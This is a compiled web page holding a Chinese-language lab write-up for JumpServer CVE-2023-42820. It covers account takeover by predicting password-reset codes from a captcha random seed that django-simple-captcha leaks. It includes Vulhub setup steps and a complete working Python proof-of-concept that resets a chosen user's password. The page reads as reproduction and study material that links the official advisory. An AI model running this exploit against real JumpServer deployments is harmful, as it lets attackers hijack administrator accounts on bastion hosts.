import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c,a as n,b as s,d as t,e as i}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r={href:"https://github.com/mbi/django-simple-captcha",target:"_blank",rel:"noopener noreferrer"},k=n("p",null,"参考链接：",-1),d={href:"https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp",target:"_blank",rel:"noopener noreferrer"},m={href:"https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html",target:"_blank",rel:"noopener noreferrer"},b=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动环境前，修改<a href="config.env">config.env</a>中<code>DOMAINS</code>的值为你的IP和端口，如<code>DOMAINS=your-ip:8080</code>。</p><p>执行如下命令启动一个JumpServer 3.6.3 的服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动服务需要等待一段时间，之后访问<code>http://your-ip:8080</code>即可查看到JumpServer的登录页面。我们使用<code>admin</code>作为账号及密码即可登录，第一次登录管理员账号需要修改密码。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231021145246261.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用Vulhub半自动化脚本复现漏洞。由于是半自动化，严格按照如下步骤方可正确复现。</p><p>首先，在浏览器第一个Tab中打开忘记密码页面：<code>http://your-ip:8080/core/auth/password/forget/previewing/</code>，此时页面上将有一个验证码。</p><ul><li>如果验证码中包含数字10，则请刷新验证码，因为我们的脚本暂时无法处理数字10</li><li>如果验证码中不包含数字10，则右键菜单中将该验证码在新Tab下打开</li></ul><p>新Tab中验证码的URL类似于<code>http://your-ip:8080/core/auth/captcha/image/87b2723d404657c2294abfab908975ebb9da5468/</code>，其中包含该验证码的key（一串sha1 hash值），也就是后面伪随机数使用的种子，记录下这个值作为<strong>seed</strong>。</p><p>返回第一个Tab，<strong>刷新页面</strong>。刷新页面的目的是，不使用包含“种子”的验证码，因为这个种子将在后续步骤中使用到。</p><p>刷新页面后正确填写用户名和验证码后提交，跳转到验证码验证页面。此时这个页面的URL类似于<code>http://your-ip:8080/core/auth/password/forgot/?token=sceOx7yWuAH9wWcuzc0nMQmLBzEPNhkhuTfl</code>，其中包含一个随机的token值，记录下这个值作为<strong>token</strong>。</p><p>执行脚本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py -t http://your-ip:8080 --email admin@whoami.com --seed [seed] --token [token]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这个脚本需要传入4个参数：</p><ul><li><code>-t</code> 指定目标JumpServer服务器地址</li><li><code>--email</code> 指定待劫持用户的邮箱地址</li><li><code>--seed</code> 前面记下来的随机数种子（<strong>seed</strong>）</li><li><code>--token</code> 前面记下来的token值（<strong>token</strong>）</li></ul><blockquote><p><s>环境启动失败（mariadb redis版本问题，修改版本启动后服务自动退出）。原docker-compose.yml中版本为：mariadb:10.11.5、redis:6.2.13</s></p><p><s>待复现，以下为Vulhub截图。</s></p></blockquote><p>脚本执行后，将输出预测的code值：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/1-16967498267261.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>回到浏览器中，输入该code提交，即可来到修改新密码页面，修改密码即可。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/2.gif" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> logging
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> argparse
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>stream<span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">,</span> <span class="token builtin">format</span><span class="token operator">=</span><span class="token string">&#39;%(asctime)s - %(levelname)s - %(message)s&#39;</span><span class="token punctuation">)</span>
string_punctuation <span class="token operator">=</span> <span class="token string">&#39;!#$%&amp;()*+,-.:;&lt;=&gt;?@[]^_~&#39;</span>


<span class="token keyword">def</span> <span class="token function">random_string</span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> lower<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> upper<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> digit<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> special_char<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    args_names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;lower&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;upper&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;digit&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;special_char&#39;</span><span class="token punctuation">]</span>
    args_values <span class="token operator">=</span> <span class="token punctuation">[</span>lower<span class="token punctuation">,</span> upper<span class="token punctuation">,</span> digit<span class="token punctuation">,</span> special_char<span class="token punctuation">]</span>
    args_string <span class="token operator">=</span> <span class="token punctuation">[</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">,</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token punctuation">,</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> string_punctuation<span class="token punctuation">]</span>
    args_string_map <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>args_names<span class="token punctuation">,</span> args_string<span class="token punctuation">)</span><span class="token punctuation">)</span>
    kwargs <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>args_names<span class="token punctuation">,</span> args_values<span class="token punctuation">)</span><span class="token punctuation">)</span>
    kwargs_keys <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>kwargs<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    kwargs_values <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>kwargs<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    args_true_count <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> kwargs_values <span class="token keyword">if</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token builtin">any</span><span class="token punctuation">(</span>kwargs_values<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&#39;Parameters </span><span class="token interpolation"><span class="token punctuation">{</span>kwargs_keys<span class="token punctuation">}</span></span><span class="token string"> must have at least one \`True\`&#39;</span></span>
    <span class="token keyword">assert</span> length <span class="token operator">&gt;=</span> args_true_count<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&#39;Expected length &gt;= </span><span class="token interpolation"><span class="token punctuation">{</span>args_true_count<span class="token punctuation">}</span></span><span class="token string">, bug got </span><span class="token interpolation"><span class="token punctuation">{</span>length<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span>

    can_startswith_special_char <span class="token operator">=</span> args_true_count <span class="token operator">==</span> <span class="token number">1</span> <span class="token keyword">and</span> special_char

    chars <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>args_string_map<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> kwargs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> v<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        password <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>chars<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> kwargs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> v <span class="token keyword">and</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token builtin">set</span><span class="token punctuation">(</span>args_string_map<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment"># 没有包含指定的字符, retry</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> can_startswith_special_char <span class="token keyword">and</span> password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> args_string_map<span class="token punctuation">[</span><span class="token string">&#39;special_char&#39;</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token comment"># 首位不能为特殊字符, retry</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token comment"># 满足要求终止 while 循环</span>
                <span class="token keyword">break</span>

    password <span class="token operator">=</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
    <span class="token keyword">return</span> password


<span class="token keyword">def</span> <span class="token function">nop_random</span><span class="token punctuation">(</span>seed<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">180</span> <span class="token operator">*</span> <span class="token number">38</span> <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">fix_seed</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> seed<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">_request</span><span class="token punctuation">(</span>i<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> u<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&#39;send %d request to %s&#39;</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> u<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
        <span class="token keyword">assert</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span>
        <span class="token keyword">assert</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;image/png&#39;</span>

    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&#39;/core/auth/captcha/image/&#39;</span> <span class="token operator">+</span> seed <span class="token operator">+</span> <span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        _request<span class="token punctuation">(</span>idx<span class="token punctuation">,</span> url<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">send_code</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> email<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> reset_token<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">&quot;/api/v1/authentication/password/reset-code/?token=&quot;</span> <span class="token operator">+</span> reset_token<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">&#39;email&#39;</span><span class="token punctuation">:</span> email<span class="token punctuation">,</span>
        <span class="token string">&#39;sms&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;form_type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;email&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span>
    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&quot;send code headers: %r response: %r&quot;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> email<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> seed<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> token<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    fix_seed<span class="token punctuation">(</span>target<span class="token punctuation">,</span> seed<span class="token punctuation">)</span>
    nop_random<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
    send_code<span class="token punctuation">(</span>target<span class="token punctuation">,</span> email<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    code <span class="token operator">=</span> random_string<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> lower<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> upper<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">&quot;your code is %s&quot;</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Process some integers.&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-t&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--target&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;target url&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--email&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;account email&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--seed&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;seed from captcha url&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;--token&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">&#39;account reset token&#39;</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    main<span class="token punctuation">(</span>args<span class="token punctuation">.</span>target<span class="token punctuation">,</span> args<span class="token punctuation">.</span>email<span class="token punctuation">,</span> args<span class="token punctuation">.</span>seed<span class="token punctuation">,</span> args<span class="token punctuation">.</span>token<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,24);function g(_,h){const a=e("ExternalLinkIcon");return o(),c("div",null,[u,n("p",null,[s("JumpServer是一个开源堡垒机系统。在其3.6.4及以下版本中，存在一处账户接管漏洞。攻击者通过第三方库"),n("a",r,[s("django-simple-captcha"),t(a)]),s("泄露的随机数种子推算出找回密码时的用户Token，最终修改用户密码。")]),k,n("ul",null,[n("li",null,[n("a",d,[s("https://github.com/jumpserver/jumpserver/security/advisories/GHSA-7prv-g565-82qp"),t(a)])]),n("li",null,[n("a",m,[s("https://mp.weixin.qq.com/s/VShjaDI1McerX843YyOENw"),t(a)])]),n("li",null,[n("a",v,[s("https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html"),t(a)])])]),b])}const f=p(l,[["render",g],["__file","JumpServer 随机数种子泄露导致账户劫持漏洞 CVE-2023-42820.html.vue"]]);export{f as default};
